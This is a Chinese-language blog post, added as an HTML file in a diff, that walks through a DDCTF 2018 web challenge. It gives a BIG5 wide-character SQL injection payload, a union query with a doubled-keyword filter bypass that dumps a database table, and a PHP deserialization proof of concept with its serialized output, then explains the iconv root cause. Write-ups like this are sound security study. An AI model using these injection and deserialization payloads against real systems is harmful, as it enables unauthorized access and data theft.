@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>DDCTF 2018 注入的奥妙 wp - sn00py</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=反序列化,SQL注入>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="sn00py" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">sn00py</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives" class="menu-item-link">Archives</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/friends/" class="menu-item-link">Frinds</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">DDCTF 2018 注入的奥妙 wp</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-04-19</span>
+  </div>
+  <div class="post-content">
+    <h2 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h2><p>WEB就做了3道,还是太菜.</p>
+<p>挑一道记录下,留个纪念.</p>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/1.jpg" alt=""></p>
+<p>题目明确说了是注入,测试发现对单引号进行了转义.这时候要么是无闭合的注入,要么就是宽字符了.</p>
+<p>测试之后都行不通.</p>
+<p>右键源码发现了hint,提示了”BIG5”.</p>
+<p>当时做的时候没有反应过来具体是啥问题,但肯定和编码有关,所以就FUZZ了下.</p>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/2.jpg" alt=""></p>
+<p>还真找到了能吃掉单引号的payload.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%ce%b1&apos; or 1%23</span><br></pre></td></tr></table></figure>
+<p>然后尝试注出数据,发现把union替空了,利用双写绕过.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.105:5033/c09764a2-8d31-4643-907a-5d663b9348dc/well/getmessage/1%ce%b1&apos; ununionion select 1,concat(id,0x7e,pattern,0x7e,action,0x7e,rulepass),3 from route_rules%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/3.jpg" alt=""></p>
+<p>在pattern字段里翻到了一个css文件,下载后改后缀解压,得到源码.</p>
+<p>貌似是自己写的个小框架,源码比较多.</p>
+<p>但是漏洞很明显,</p>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/5.jpg" alt=""></p>
+<p>Justtry类的try()方法存在反序列化.</p>
+<p>然后就去看怎么拿到flag.</p>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/4.jpg" alt=""></p>
+<p>在Test类的getflag()方法里会直接输出flag,所以找出调用链就行了.</p>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/6.jpg" alt=""></p>
+<p>Test类的析构函数调用了getflag(),所以反序列化Test类就行了.</p>
+<p>POC.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $user_uuid;</span><br><span class="line">    <span class="keyword">public</span> $fl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;user_uuid = <span class="string">'c09764a2-8d31-4643-907a-5d663b9348dc'</span>;</span><br><span class="line">$a-&gt;fl = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;fl-&gt;sql = <span class="keyword">new</span> SQL();</span><br><span class="line"><span class="keyword">echo</span> $se = serialize($a);</span><br></pre></td></tr></table></figure>
+<p>最后得到的payload还要手动加上命名空间,并且修改长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwer=O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>post过去就能拿到flag.</p>
+<p>最后,再回过头来看看这个注入到底怎么产生的.</p>
+<p>在Well.php中,</p>
+<p><img src="/2018/04/19/DDCTF-2018-WEB3-wp/7.jpg" alt=""></p>
+<p>原来是使用iconv()函数进行了编码转换.</p>
+<p>UTF8中的<code>α</code>字符,HEX值为<code>ceb1</code>,转换成BIG5后,HEX值为<code>a35c</code>,而<code>5c</code>就是一个反斜线,所以吃掉了后面的转义反斜线.</p>
+<h2 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><ol>
+<li>反序列化的要领: 控制对象属性; 调用魔术方法.</li>
+<li>序列化字符串手动加命名空间.</li>
+</ol>
+
+  </div>
+  <div class="post-footer">
+    
+      <ul class="post-tag-list"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/反序列化/">反序列化</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2018
+  <span class="author">
+    sn00py
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
